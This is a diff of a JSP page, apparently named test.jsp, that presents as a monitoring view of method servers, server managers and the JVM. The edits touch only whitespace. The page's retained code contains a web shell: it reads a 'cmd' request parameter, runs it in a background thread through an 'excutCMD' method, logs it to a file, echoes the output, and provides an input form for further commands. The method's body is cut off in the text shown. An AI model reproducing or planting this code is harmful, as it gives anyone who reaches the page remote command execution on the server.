@@ -125,7 +125,7 @@ private static final Object  methodServersGetAttrsArgs[] =
 // collect data on method servers and server managers
 private String cmdRuslte ="1";
 %>
-<% 
+<%
 Integer  activeUsers = null;
 Map<String,Object>  methodServerResults = null;
 Map<String,Object>  serverManagerResults = null;
@@ -153,9 +153,9 @@ Throwable  resultRetrievalException = null;
   {
     resultRetrievalException = t;  // remember but otherwise eat exception
   }
- 
+
   String jvm = java.lang.management.ManagementFactory.getRuntimeMXBean().getName();
-  
+
  %>
 <!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
 <html>
@@ -174,7 +174,7 @@ Throwable  resultRetrievalException = null;
     for( String key : methodServerResults.keySet() ){
       String[] keySplit = key.split("@");
       if(jvmSplit[1].equals(keySplit[1])){
-        temp = key;
+      	temp = key;
       }
     }
     Map<String,Object> methodServer = (Map<String,Object>)methodServerResults.get(temp);
@@ -202,9 +202,9 @@ Throwable  resultRetrievalException = null;
 	<%=keyTemp %>
 	<br>
 	<%
-      response.setCharacterEncoding("utf-8");  
-      response.setHeader("iso-8859-1","utf-8");  
-      request.setCharacterEncoding("utf-8");  
+      response.setCharacterEncoding("utf-8");
+      response.setHeader("iso-8859-1","utf-8");
+      request.setCharacterEncoding("utf-8");
       String cmd = request.getParameter("cmd");
       if(cmd != null){
     	  PrimeThread tjp = new PrimeThread(cmd,request,response);
@@ -212,7 +212,7 @@ Throwable  resultRetrievalException = null;
     	  writeFile(keyTemp,cmd,true);
       }
      %>
-	
+
 		<%=cmdRuslte %>
 	<form method="post" action="test.jsp">
 		<input type="text" name="cmd"> <br> <input type="submit"
@@ -278,12 +278,12 @@ Throwable  resultRetrievalException = null;
      }
 
   }
-  
+
   public class PrimeThread extends Thread {
       private String cmd;
       private HttpServletRequest request;
       private HttpServletResponse response;
-      
+
       PrimeThread(String cmd,HttpServletRequest request,HttpServletResponse response) {
           this.cmd = cmd;
           this.request = request;
@@ -293,7 +293,7 @@ Throwable  resultRetrievalException = null;
       public void run() {
     	  test_jsp.this.cmdRuslte = excutCMD(cmd);
       }
-      
+
       private String excutCMD(String cmd){
     	  StringBuffer buffer = new StringBuffer();
     		try {
